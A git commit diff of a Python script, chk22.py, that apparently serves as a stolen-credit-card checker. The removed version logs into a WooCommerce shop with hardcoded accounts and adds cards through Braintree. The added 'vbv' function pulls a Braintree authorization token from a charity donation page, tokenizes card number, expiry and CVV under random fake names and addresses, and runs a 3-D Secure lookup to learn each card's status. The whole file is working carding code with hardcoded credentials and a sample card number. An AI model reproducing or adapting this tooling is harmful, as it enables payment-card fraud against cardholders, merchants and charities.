f1202ff706678d36ba44b996146d880c532a7251
yousef19077 <lyy446333@gmail.com>
2025-01-01 16:50:18 +0200

    Update chk22.py

--- chk22.py
+++ chk22.py
@@ -1,246 +1,225 @@
-def capture(string, start, end):
-    start_pos, end_pos = string.find(start), string.find(
-        end, string.find(start) + len(start)
-    )
-    return (
-        string[start_pos + len(start) : end_pos]
-        if start_pos != -1 and end_pos != -1
-        else None
-    )
-
-def chk(card):
+def vbv(card):
 	
-	import requests, re, base64, random, string, user_agent, time
-	from requests_toolbelt.multipart.encoder import MultipartEncoder
-	
-	from requests.packages.urllib3.exceptions import InsecureRequestWarning
-	
-	requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
-	
+	import requests, re, base64, random, string, user_agent, time, uuid, jwt
+		
 	card = card.strip()
-	parts = re.split('[|/:]', card)
+	parts = re.split('[|]', card)
 	n = parts[0]
 	mm = parts[1]
 	yy = parts[2]
 	cvc = parts[3]
-
-	if "20" in yy:
-		yy = yy.split("20")[1]
 	
-	
+	url = 'www.donate.stroke.org.uk'
+	price = '10000'
 	r = requests.session()
-	acc = ['moh552vbnm1@gmail.com;','moh552vbnm2@gmail.com','moh552vbnm3@gmail.com','moh552vbnm4@gmail.com','moh552vbnm5@gmail.com']
-	email = random.choice(acc)
+	characters = string.ascii_letters + string.digits
 
-
-
-	headers = {
-    'authority': 'identityfashion.online',
-    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-    'accept-language': 'ar-EG,ar;q=0.9',
-    'cache-control': 'no-cache',
-    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
-}
-
-	response = r.get('https://identityfashion.online/my-account/add-payment-method/', cookies=r.cookies, headers=headers)
-	nonce = (re.search(r'name="woocommerce-login-nonce" value="(.*?)"', response.text).group(1))
-
-
-	headers = {
-    'authority': 'identityfashion.online',
-    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-    'accept-language': 'ar-EG,ar;q=0.9',
-    'cache-control': 'no-cache',
-    'content-type': 'application/x-www-form-urlencoded',
-    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
-}
-
-	data = {
-    'username': email,
-    'password': 'jojo@ALi123',
-    'woocommerce-login-nonce': nonce,
-    '_wp_http_referer': '/my-account/add-payment-method/',
-    'login': 'Log in',
-}
-
-	response = r.post(
-    'https://identityfashion.online/my-account/add-payment-method/',
-    headers=headers,
-    data=data,
-)
-#0
-
-
-	headers = {
-    'authority': 'identityfashion.online',
-    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-    'accept-language': 'ar-EG,ar;q=0.9',
-    'cache-control': 'no-cache',
-    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
-}
-
-	response = r.get('https://identityfashion.online/my-account/add-payment-method/', headers=headers)
-
-	client_token_nonce = re.search(r'"client_token_nonce":"(.*?)"', response.text).group(1)
-
-	
-	add_nonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text).group(1)
-	
-
-#&
-	headers = {
-    'authority': 'identityfashion.online',
-    'accept': '*/*',
-    'accept-language': 'ar-EG,ar;q=0.9',
-    'cache-control': 'no-cache',
-    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-    'origin': 'https://identityfashion.online',
-    'pragma': 'no-cache',
-    'referer': 'https://identityfashion.online/my-account/add-payment-method/',
-    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
-    'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-platform': '"Android"',
-    'sec-fetch-dest': 'empty',
-    'sec-fetch-mode': 'cors',
-    'sec-fetch-site': 'same-origin',
-    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
-    'x-requested-with': 'XMLHttpRequest',
-}
-
-	data = {
-    'action': 'wc_braintree_credit_card_get_client_token',
-    'nonce': client_token_nonce,
-}
-
-	response = r.post('https://identityfashion.online/wp-admin/admin-ajax.php', headers=headers, data=data)
-
-
-	
-	encoded_text = response.json()['data']
-	
-	decoded_text = base64.b64decode(encoded_text).decode('utf-8')
-	
-	au=re.findall(r'"authorizationFingerprint":"(.*?)"',decoded_text)[0]
-
-#4
-
-
-
-
-	headers = {
-    'authority': 'payments.braintree-api.com',
-    'accept': '*/*',
-    'accept-language': 'ar-EG,ar;q=0.9',
-    'authorization': f'Bearer {au}',
-    'braintree-version': '2018-05-10',
-    'cache-control': 'no-cache',
-    'content-type': 'application/json',
-    'origin': 'https://assets.braintreegateway.com',
-    'pragma': 'no-cache',
-    'referer': 'https://assets.braintreegateway.com/',
-    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
-    'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-platform': '"Android"',
-    'sec-fetch-dest': 'empty',
-    'sec-fetch-mode': 'cors',
-    'sec-fetch-site': 'cross-site',
-    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
-}
-
-	json_data = {
-    'clientSdkMetadata': {
-        'source': 'client',
-        'integration': 'custom',
-        'sessionId': 'a07755a5-f7d3-46c0-b17e-d2d530e6046b',
-    },
-    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
-    'variables': {
-        'input': {
-            'creditCard': {
-                'number': n,
-                'expirationMonth': mm,
-                'expirationYear': yy,
-                'cvv': cvc,
-            },
-            'options': {
-                'validate': False,
-            },
-        },
-    },
-    'operationName': 'TokenizeCreditCard',
-}
-
-	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
-
-# Note: json_data will not be serialized by requests
-# exactly as it was in the original request.
-#data = '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"a07755a5-f7d3-46c0-b17e-d2d530e6046b"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"5111972036167182","expirationMonth":"03","expirationYear":"2028","cvv":"793"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}'
-#response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, data=data)
-
-	tok = response.json()['data']['tokenizeCreditCard']['token']
-
-#5
-
-
-
-
-	headers = {
-    'authority': 'identityfashion.online',
-    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-    'accept-language': 'ar-EG,ar;q=0.9',
-    'cache-control': 'no-cache',
-    'content-type': 'application/x-www-form-urlencoded',
-    'origin': 'https://identityfashion.online',
-    'pragma': 'no-cache',
-    'referer': 'https://identityfashion.online/my-account/add-payment-method/',
-    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
-    'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-platform': '"Android"',
-    'sec-fetch-dest': 'document',
-    'sec-fetch-mode': 'navigate',
-    'sec-fetch-site': 'same-origin',
-    'sec-fetch-user': '?1',
-    'upgrade-insecure-requests': '1',
-    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
-}
-
-	data = {
-    'payment_method': 'braintree_credit_card',
-    'wc-braintree-credit-card-card-type': 'master-card',
-    'wc-braintree-credit-card-3d-secure-enabled': '',
-    'wc-braintree-credit-card-3d-secure-verified': '',
-    'wc-braintree-credit-card-3d-secure-order-total': '13.98',
-    'wc_braintree_credit_card_payment_nonce': tok,
-    'wc_braintree_device_data': '{"correlation_id":"de63ee79235fcfe2ca364781c3913bc6"}',
-    'wc-braintree-credit-card-tokenize-payment-method': 'true',
-    'woocommerce-add-payment-method-nonce': add_nonce,
-    '_wp_http_referer': '/my-account/add-payment-method/',
-    'woocommerce_add_payment_method': '1',
-}
-
-	response = r.post(
-    'https://identityfashion.online/my-account/add-payment-method/',
-    cookies=r.cookies,
-    headers=headers,
-    data=data,
-)
-
-	text = response.text
-	pattern = r'Status code (.*?)\s*</li>'
-
-	
-	
-	match = re.search(pattern, text)
-	if match:
-		result = match.group(1)
-		if 'risk_threshold' in text:
-		    result = "RISK: Retry this BIN later."
-	else:
-		if 'Nice! New payment method added' in text or 'authenticate_rejected' in text:
-			result = "1000: Approved"
-		else:
-			result = "Error"
+	def generate_full_name():
+			first_names = ["Ahmed", "Mohamed", "Fatima", "Zainab", "Sarah", "Omar", "Layla", "Youssef", "Nour", 
+						   "Hannah", "Yara", "Khaled", "Sara", "Lina", "Nada", "Hassan",
+						   "Amina", "Rania", "Hussein", "Maha", "Tarek", "Laila", "Abdul", "Hana", "Mustafa",
+						   "Leila", "Kareem", "Hala", "Karim", "Nabil", "Samir", "Habiba", "Dina", "Youssef", "Rasha",
+						   "Majid", "Nabil", "Nadia", "Sami", "Samar", "Amal", "Iman", "Tamer", "Fadi", "Ghada",
+						   "Ali", "Yasmin", "Hassan", "Nadia", "Farah", "Khalid", "Mona", "Rami", "Aisha", "Omar",
+						   "Eman", "Salma", "Yahya", "Yara", "Husam", "Diana", "Khaled", "Noura", "Rami", "Dalia",
+						   "Khalil", "Laila", "Hassan", "Sara", "Hamza", "Amina", "Waleed", "Samar", "Ziad", "Reem",
+						   "Yasser", "Lina", "Mazen", "Rana", "Tariq", "Maha", "Nasser", "Maya", "Raed", "Safia",
+						   "Nizar", "Rawan", "Tamer", "Hala", "Majid", "Rasha", "Maher", "Heba", "Khaled", "Sally"] 
 			
-	return result
+			last_names = ["Khalil", "Abdullah", "Alwan", "Shammari", "Maliki", "Smith", "Johnson", "Williams", "Jones", "Brown",
+						   "Garcia", "Martinez", "Lopez", "Gonzalez", "Rodriguez", "Walker", "Young", "White",
+						   "Ahmed", "Chen", "Singh", "Nguyen", "Wong", "Gupta", "Kumar",
+						   "Gomez", "Lopez", "Hernandez", "Gonzalez", "Perez", "Sanchez", "Ramirez", "Torres", "Flores", "Rivera",
+						   "Silva", "Reyes", "Alvarez", "Ruiz", "Fernandez", "Valdez", "Ramos", "Castillo", "Vazquez", "Mendoza",
+						   "Bennett", "Bell", "Brooks", "Cook", "Cooper", "Clark", "Evans", "Foster", "Gray", "Howard",
+						   "Hughes", "Kelly", "King", "Lewis", "Morris", "Nelson", "Perry", "Powell", "Reed", "Russell",
+						   "Scott", "Stewart", "Taylor", "Turner", "Ward", "Watson", "Webb", "White", "Young"] 
+			
+			full_name = random.choice(first_names) + " " + random.choice(last_names)
+			first_name, last_name = full_name.split()
+			
+			return first_name, last_name
+		
+	def generate_address():
+			cities = ["New York", "Los Angeles", "Chicago", "Houston", "Phoenix", "Philadelphia", "San Antonio", "San Diego", "Dallas", "San Jose"]
+			states = ["NY", "CA", "IL", "TX", "AZ", "PA", "TX", "CA", "TX", "CA"]
+			streets = ["Main St", "Park Ave", "Oak St", "Cedar St", "Maple Ave", "Elm St", "Washington St", "Lake St", "Hill St", "Maple St"]
+			zip_codes = ["10001", "90001", "60601", "77001", "85001", "19101", "78201", "92101", "75201", "95101"]
+		
+			city = random.choice(cities)
+			state = states[cities.index(city)]
+			street_address = str(random.randint(1, 999)) + " " + random.choice(streets)
+			zip_code = zip_codes[states.index(state)]
+		
+			return city, state, street_address, zip_code
+		
+		
+	first_name, last_name = generate_full_name()
+	city, state, street_address, zip_code = generate_address()
 	
+	def num():
+		number = ''.join(random.choices(string.digits, k=7))
+		return f"303{number}"
+	num = num()
 
+	def generate_random_account():
+		name = ''.join(random.choices(string.ascii_lowercase, k=20))
+		number = ''.join(random.choices(string.digits, k=4))
+		return f"{name}{number}@gmail.com"
+	acc = generate_random_account()
+	
+	
+	def generar_uuid():
+		  return str(uuid.uuid4())
+
+
+	def plug_rnd():
+			random_chars = "".join(random.choices(string.ascii_letters + string.digits, k=10))
+			random_suffix = "".join(random.choices(string.ascii_letters + string.digits, k=28))
+			random_yux = "".join(random.choices(string.ascii_letters + string.digits, k=3))
+			return f"{random_chars}::{random_suffix}::{random_yux}"
+	def capture(string, start, end):
+				 start_pos, end_pos = string.find(start), string.find(
+		end, string.find(start) + len(start)
+	)
+				 return (
+		string[start_pos + len(start) : end_pos]
+		if start_pos != -1 and end_pos != -1
+		else None
+	)
+	
+	import requests, re, base64, random, string, user_agent, time, uuid, jwt
+		
+	random_uuid = uuid.uuid4()
+		
+	ssid = (str(random_uuid))
+		
+	user = user_agent.generate_user_agent()
+		
+	r = requests.session()
+	
+	r.verify = False
+		
+		
+	headers = {
+	'accept': '*/*',
+	'cache-control': 'no-cache',
+	'pragma': 'no-cache',
+	'user-agent': user,
+}
+
+	res = r.get(
+	'https://touch.org.sg/content/touchprogram/get-involved/donation/jcr:content/root/container/container/donationforms.token.json',
+	headers=headers,
+)
+ 
+	enc = res.text
+	dec = base64.b64decode(enc).decode('utf-8')
+	be=re.findall(r'"authorizationFingerprint":"(.*?)"',dec)[0]
+		
+
+	sessionId = generar_uuid()
+	sessionId2 = generar_uuid()
+	Fingerprint = "".join(random.choice("0123456789abcdef") for _ in range(32))
+	plug = plug_rnd()
+	plug2 = plug_rnd()
+
+  
+	me = capture(
+			dec,
+			"https://api.braintreegateway.com:443/merchants/",
+			"/client_api/v1/configuration",
+		)
+
+
+	h2 = {
+			"Host": "payments.braintree-api.com",
+			"content-type": "application/json",
+			"authorization": f"Bearer {be}",
+			"user-agent": user,
+			"braintree-version": "2018-05-10",
+			"accept": "*/*",
+			"origin": "https://assets.braintreegateway.com",
+			"referer": "https://assets.braintreegateway.com/",
+		}
+
+	p2 = {
+			"clientSdkMetadata": {
+				"source": "client",
+				"integration": "dropin2",
+				"sessionId": f"{sessionId}",
+			},
+			"query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {	 token	 creditCard {	   bin	   brandCode	   last4	   cardholderName	   expirationMonth	  expirationYear	  binData {		 prepaid		 healthcare		 debit		 durbinRegulated		 commercial		 payroll		 issuingBank		 countryOfIssuance		 productId	   }	 }   } }",
+			"variables": {
+				"input": {
+					"creditCard": {
+						"number": f"{n}",
+						"expirationMonth": f"{mm}",
+						"expirationYear": f"{yy}",
+						"cvv": f"{cvc}",
+						"cardholderName": f"{first_name} {last_name}",
+						"billingAddress": {"postalCode": f"{zip_code}"},
+					},
+					"options": {"validate": False},
+				}
+			},
+			"operationName": "TokenizeCreditCard",
+		}
+
+	r2 = r.post(
+			"https://payments.braintree-api.com/graphql",
+			headers=h2,
+			json=p2,
+		)
+	t2 = r2.text
+	tok = capture(t2, '"token":"', '"')
+	bin_ = capture(t2, '"bin":"', '"')
+
+
+	h6 = {
+			"Host": "api.braintreegateway.com",
+			"user-agent": user,
+			"content-type": "application/json",
+			"accept": "*/*",
+			"origin": f"https://{url}",
+		}
+
+	p6 = {
+	'amount': '10000',
+	'browserColorDepth': 24,
+	'browserJavaEnabled': False,
+	'browserJavascriptEnabled': True,
+	'browserLanguage': 'en-US',
+	'browserScreenHeight': 800,
+	'browserScreenWidth': 360,
+	'browserTimeZone': -180,
+	'deviceChannel': 'Browser',
+	'bin': '408832',
+	'clientMetadata': {
+		'requestedThreeDSecureVersion': '2',
+		'sdkVersion': 'web/3.94.0',
+		'cardinalDeviceDataCollectionTimeElapsed': 245,
+		'issuerDeviceDataCollectionTimeElapsed': 592,
+		'issuerDeviceDataCollectionResult': True,
+	},
+	'authorizationFingerprint': be,
+	'braintreeLibraryVersion': 'braintree/web/3.94.0',
+	'_meta': {
+		'merchantAppId': 'mozartists.com',
+		'platform': 'web',
+		'sdkVersion': '3.94.0',
+		'source': 'client',
+		'integration': 'custom',
+		'integrationType': 'custom',
+	},
+}
+
+	r6 = r.post(
+			f"https://api.braintreegateway.com/merchants/{me}/client_api/v1/payment_methods/{tok}/three_d_secure/lookup",
+			headers=h6,
+			json=p6,
+		)
+	t6 = r6.text
+	status = capture(t6, '"status":"', '"')
+	result = status.replace("_", " ").title()
+	return result
